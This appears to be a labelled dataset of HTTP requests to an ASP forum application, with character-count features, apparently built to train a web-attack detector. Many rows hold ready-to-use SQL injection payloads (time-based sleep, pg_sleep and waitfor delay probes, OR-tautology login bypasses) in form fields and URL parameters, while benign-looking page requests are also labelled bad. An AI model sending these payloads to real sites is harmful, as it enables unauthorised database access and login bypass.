method,path,body,single_q,double_q,dashes,braces,spaces,badwords,class
POST,/Register.asp,tfEmail=(select(0)from(select(sleep(6)))v)/*'%2b(select(0)from(select(sleep(6)))v)%2b'%22%2b(select(0)from(select(sleep(6)))v)%2b%22*/&tfRName=gdrwwius&tfUName=gdrwwius&tfUPass=g00dPa%24%24w0rD,2,2,0,15,0,9,bad
GET,/Register.asp?RetURL=(select(0)from(select(sleep(6)))v)/*'%2b(select(0)from(select(sleep(6)))v)%2b'%22%2b(select(0)from(select(sleep(6)))v)%2b%22*/,,2,2,0,15,0,9,bad
GET,/Templates/Login.asp?RetURL=(select(0)from(select(sleep(9)))v)/*'%2b(select(0)from(select(sleep(9)))v)%2b'%22%2b(select(0)from(select(sleep(9)))v)%2b%22*/,,2,2,0,15,0,9,bad
GET,/Search.asp?tfSearch=(select(0)from(select(sleep(9)))v)/*'%2b(select(0)from(select(sleep(9)))v)%2b'%22%2b(select(0)from(select(sleep(9)))v)%2b%22*/,,2,2,0,15,0,9,bad
POST,/Register.asp,tfEmail=sample%40email.tst&tfRName=gdrwwius&tfUName=gdrwwius&tfUPass=(select(0)from(select(sleep(3)))v)/*'%2b(select(0)from(select(sleep(3)))v)%2b'%22%2b(select(0)from(select(sleep(3)))v)%2b%22*/,2,2,0,15,0,9,bad
GET,/Templatize.asp?item=(select(0)from(select(sleep(9)))v)/*'%2b(select(0)from(select(sleep(9)))v)%2b'%22%2b(select(0)from(select(sleep(9)))v)%2b%22*/,,2,2,0,15,0,9,bad
POST,/Register.asp,tfEmail=sample%40email.tst&tfRName=(select(0)from(select(sleep(3)))v)/*'%2b(select(0)from(select(sleep(3)))v)%2b'%22%2b(select(0)from(select(sleep(3)))v)%2b%22*/&tfUName=gdrwwius&tfUPass=g00dPa%24%24w0rD,2,2,0,15,0,9,bad
POST,/Register.asp,tfEmail=sample%40email.tst&tfRName=gdrwwius&tfUName=(select(0)from(select(sleep(6)))v)/*'%2b(select(0)from(select(sleep(6)))v)%2b'%22%2b(select(0)from(select(sleep(6)))v)%2b%22*/&tfUPass=g00dPa%24%24w0rD,2,2,0,15,0,9,bad
GET,/Templatize.asp?item=(select(0)from(select(sleep(0)))v)/*'%2b(select(0)from(select(sleep(0)))v)%2b'%22%2b(select(0)from(select(sleep(0)))v)%2b%22*/,,2,2,0,15,0,9,bad
GET,/Templatize.asp?item=(select(0)from(select(sleep(3)))v)/*'%2b(select(0)from(select(sleep(3)))v)%2b'%22%2b(select(0)from(select(sleep(3)))v)%2b%22*/,,2,2,0,15,0,9,bad
GET,/Templates/Login.asp?RetURL=RM2OQvPk'));select%20pg_sleep(3);%20--%20,,1,0,1,1,3,2,bad
GET,/Templatize.asp?item=wl86feFe');select%20pg_sleep(3);%20--%20,,1,0,1,1,3,2,bad
GET,/Templates/Login.asp?RetURL=W3y8Rz3O';select%20pg_sleep(3);%20--%20,,1,0,1,1,3,2,bad
GET,/Login.asp?RetURL=LQT4HdrC'));%20waitfor%20delay%20'0:0:3'%20--%20,,3,0,1,0,5,2,bad
POST,/Register.asp,tfEmail=sample%40email.tst&tfRName=Bvbw1BPf';select%20pg_sleep(6);%20--%20&tfUName=gdrwwius&tfUPass=g00dPa%24%24w0rD,1,0,1,1,3,2,bad
GET,/Templates/Login.asp?RetURL=KoZvGcJt');%20waitfor%20delay%20'0:0:9'%20--%20,,3,0,1,0,5,2,bad
GET,/Templates/Register.asp?RetURL=BRNoXvHX');%20waitfor%20delay%20'0:0:6'%20--%20,,3,0,1,0,5,2,bad
POST,/Register.asp,tfEmail=sample%40email.tst&tfRName=gdrwwius&tfUName=TF3x1yVI';select%20pg_sleep(0);%20--%20&tfUPass=g00dPa%24%24w0rD,1,0,1,1,3,2,bad
GET,/Search.asp?tfSearch=i1YBWl1O';%20waitfor%20delay%20'0:0:9'%20--%20,,3,0,1,0,5,2,bad
GET,/Search.asp?tfSearch=XsaWGp0H');select%20pg_sleep(6);%20--%20,,1,0,1,1,3,2,bad
GET,/Templates/Register.asp?RetURL=HHg9BYa8'));select%20pg_sleep(9);%20--%20,,1,0,1,1,3,2,bad
POST,/Register.asp,tfEmail=sample%40email.tst&tfRName=gdrwwius&tfUName=oz7MSNlX');%20waitfor%20delay%20'0:0:9'%20--%20&tfUPass=g00dPa%24%24w0rD,3,0,1,0,5,2,bad
GET,/Register.asp?RetURL=aUgOVUlm';select%20pg_sleep(9);%20--%20,,1,0,1,1,3,2,bad
POST,/Register.asp,tfEmail=sample%40email.tst&tfRName=gdrwwius&tfUName=K29EAdnz';select%20pg_sleep(6);%20--%20&tfUPass=g00dPa%24%24w0rD,1,0,1,1,3,2,bad
POST,/Register.asp,tfEmail=qlJDZPZD'));select%20pg_sleep(3);%20--%20&tfRName=gdrwwius&tfUName=gdrwwius&tfUPass=g00dPa%24%24w0rD,1,0,1,1,3,2,bad
GET,/Templatize.asp?item=o4JxCoaB';select%20pg_sleep(3);%20--%20,,1,0,1,1,3,2,bad
POST,/Register.asp,tfEmail=sample%40email.tst&tfRName=gdrwwius&tfUName=asetpfpE'));select%20pg_sleep(9);%20--%20&tfUPass=g00dPa%24%24w0rD,1,0,1,1,3,2,bad
POST,/Register.asp,tfEmail=sample%40email.tst&tfRName=dyeBAo6H');%20waitfor%20delay%20'0:0:6'%20--%20&tfUName=gdrwwius&tfUPass=g00dPa%24%24w0rD,3,0,1,0,5,2,bad
POST,/Register.asp,tfEmail=sample%40email.tst&tfRName=LcifpS6B');select%20pg_sleep(6);%20--%20&tfUName=gdrwwius&tfUPass=g00dPa%24%24w0rD,1,0,1,1,3,2,bad
GET,/Templatize.asp?item=co9wP73t'));%20waitfor%20delay%20'0:0:9'%20--%20,,3,0,1,0,5,2,bad
GET,/Login.asp?RetURL=QENPPi0s'));select%20pg_sleep(6);%20--%20,,1,0,1,1,3,2,bad
POST,/Register.asp,tfEmail=Ntyfcll0');select%20pg_sleep(3);%20--%20&tfRName=gdrwwius&tfUName=gdrwwius&tfUPass=g00dPa%24%24w0rD,1,0,1,1,3,2,bad
POST,/Register.asp,tfEmail=sample%40email.tst&tfRName=gdrwwius&tfUName=6NGvE2yx'));%20waitfor%20delay%20'0:0:9'%20--%20&tfUPass=g00dPa%24%24w0rD,3,0,1,0,5,2,bad
GET,/Search.asp?tfSearch=3gGZcchd');%20waitfor%20delay%20'0:0:9'%20--%20,,3,0,1,0,5,2,bad
GET,/Register.asp?RetURL=d5dJ6rKt';%20waitfor%20delay%20'0:0:6'%20--%20,,3,0,1,0,5,2,bad
GET,/Register.asp?RetURL=aQrIVG6I'));select%20pg_sleep(3);%20--%20,,1,0,1,1,3,2,bad
POST,/Register.asp,tfEmail=sample%40email.tst&tfRName=TVOGnoT3';%20waitfor%20delay%20'0:0:3'%20--%20&tfUName=gdrwwius&tfUPass=g00dPa%24%24w0rD,3,0,1,0,5,2,bad
GET,/,,0,0,0,0,0,0,bad
GET,/avatars/,,0,0,0,0,0,0,bad
GET,/Templates/Login.asp,,0,0,0,0,0,0,bad
GET,/showthread.asp,,0,0,0,0,0,0,bad
GET,/Login.asp,,0,0,0,0,0,0,bad
GET,/Templates/,,0,0,0,0,0,0,bad
GET,/Templates/Login.asp,,0,0,0,0,0,0,bad
GET,/showthread.asp,,0,0,0,0,0,0,bad
GET,/Register.asp,,0,0,0,0,0,0,bad
GET,/Templatize.asp,,0,0,0,0,0,0,bad
GET,/Search.asp?tfSearch=the,,0,0,0,0,0,0,bad
GET,/Search.asp,,0,0,0,0,0,0,bad
GET,/Templates/Login.asp?RetURL=%5c,,0,0,0,0,0,0,bad
GET,/Templates/Login.asp,,0,0,0,0,0,0,bad
GET,/Templatize.asp,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/Templates/Login.asp,,0,0,0,0,0,0,bad
GET,/Templates/,,0,0,0,0,0,0,bad
GET,/Templatize.asp,,0,0,0,0,0,0,bad
GET,/Templates/Login.asp,,0,0,0,0,0,0,bad
GET,/showforum.asp,,0,0,0,0,0,0,bad
GET,/Login.asp,,0,0,0,0,0,0,bad
GET,/Templatize.asp,,0,0,0,0,0,0,bad
GET,/Templates/Register.asp?RetURL=/Templates/MainTemplate.dwt.asp%3F,,0,0,0,0,0,0,bad
GET,/Templates/Login.asp,,0,0,0,0,0,0,bad
GET,/Register.asp?RetURL=/Search.asp%253F,,0,0,0,0,0,0,bad
GET,/Templatize.asp,,0,0,0,0,0,0,bad
GET,/Search.asp,,0,0,0,0,0,0,bad
GET,/Templates/,,0,0,0,0,0,0,bad
POST,/Register.asp,tfEmail=sample%40email.tst&tfRName=-1%22%20OR%202%2b860-860-1%3d0%2b0%2b0%2b1%20--%20&tfUName=gdrwwius&tfUPass=g00dPa%24%24w0rD,0,1,1,0,4,0,bad
GET,/Templatize.asp,,0,0,0,0,0,0,bad
GET,/Templates/Register.asp,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/Login.asp,,0,0,0,0,0,0,bad
POST,/Login.asp,tfUName=-1'%20OR%203*2>(0%2b5%2b370-370)%20--%20&tfUPass=g00dPa%24%24w0rD,1,0,1,1,4,0,bad
GET,/avatars/,,0,0,0,0,0,0,bad
GET,/avatars/,,0,0,0,0,0,0,bad
GET,/Templates/Register.asp,,0,0,0,0,0,0,bad
GET,/Templates/Login.asp,,0,0,0,0,0,0,bad
POST,/Login.asp,tfUName=lswrbjsp&tfUPass=-1'%20OR%202%2b1-1-1%3d1%20AND%20000548%3d000548%20--%20,1,0,1,0,6,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/Search.asp,,0,0,0,0,0,0,bad
GET,/Templates/,,0,0,0,0,0,0,bad
GET,/Login.asp,,0,0,0,0,0,0,bad
GET,/Templates/Register.asp,,0,0,0,0,0,0,bad
GET,/Login.asp,,0,0,0,0,0,0,bad
GET,/Images/,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
POST,/Login.asp,tfUName=lswrbjsp&tfUPass=-1'%20OR%203*2<(0%2b5%2b368-368)%20--%20,1,0,1,1,4,0,bad
GET,/Templates/,,0,0,0,0,0,0,bad
GET,/Register.asp,,0,0,0,0,0,0,bad
GET,/showforum.asp,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/Templates/Login.asp,,0,0,0,0,0,0,bad
GET,/Search.asp,,0,0,0,0,0,0,bad
GET,/Login.asp,,0,0,0,0,0,0,bad
GET,/Templatize.asp,,0,0,0,0,0,0,bad
GET,/Search.asp,,0,0,0,0,0,0,bad
GET,/Templates/Register.asp,,0,0,0,0,0,0,bad
GET,/Templates/Register.asp,,0,0,0,0,0,0,bad
GET,/Register.asp,,0,0,0,0,0,0,bad
GET,/Templatize.asp,,0,0,0,0,0,0,bad
